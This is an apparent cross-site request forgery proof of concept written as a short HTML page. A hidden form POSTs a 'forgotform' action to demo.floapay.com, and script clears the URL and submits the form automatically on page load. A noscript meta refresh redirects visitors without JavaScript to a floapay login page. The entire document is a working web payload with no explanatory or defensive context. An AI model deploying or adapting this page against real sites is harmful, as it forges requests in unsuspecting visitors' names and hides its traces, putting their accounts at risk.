    <form id="autoForm" action="https://demo.floapay.com/index.php" method="POST">

      <input type="hidden" name="action" value="forgotform" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      (function () {
        // keep URL clean
        try { history.replaceState('', '', '/'); } catch (e) {}

        const f = document.getElementById('autoForm');

        // If DOM already ready, submit now. Otherwise submit on DOMContentLoaded.
        function doSubmit() {
          try {
            // next-tick fallback to avoid racing with other scripts
            setTimeout(() => { try { f.submit(); } catch(e){} }, 0);
          } catch (e) {}
        }

        if (document.readyState === 'complete' || document.readyState === 'interactive') {
          doSubmit();
        } else {
          document.addEventListener('DOMContentLoaded', doSubmit, { once: true });
        }
      })();
    </script>
    <noscript>
      <!-- fallback for users with JS disabled -->
      <meta http-equiv="refresh" content="0;url=https://www.formation.floapay.com/login.php" />
    </noscript>
